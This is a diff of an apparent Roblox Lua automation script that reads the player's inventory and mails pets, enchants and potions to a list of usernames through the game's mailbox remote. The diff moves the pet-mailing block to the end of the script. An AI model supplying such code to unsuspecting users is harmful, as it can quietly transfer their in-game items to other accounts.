@@ -4,28 +4,6 @@ local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.S
 local result = saveModule.Get()
 
 
-item = "Frostbyte Bear"
-
-local pet = result.Inventory.Pet
-for i, v in pairs(pet) do
-    if v.id == item then
-	for j, username in ipairs(names)do
-        	local args = {
-            	username,
-            	item,
-            	"Pet",
-            	i,
-            	40
-        	}
-        	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-		task.wait(2)
-	end
-    end
-end
-
-
-
-
 item = "Super Lightning"
 
 local enchants = result.Inventory.Enchant
@@ -111,3 +89,26 @@ for i, v in pairs(potions) do
 end
 
 task.wait(2)
+
+local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local result = saveModule.Get()
+
+
+item = "Frostbyte Bear"
+
+local pet = result.Inventory.Pet
+for i, v in pairs(pet) do
+    if v.id == item then
+	for j, username in ipairs(names)do
+        	local args = {
+            	username,
+            	item,
+            	"Pet",
+            	i,
+            	40
+        	}
+        	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+		task.wait(2)
+	end
+    end
+end
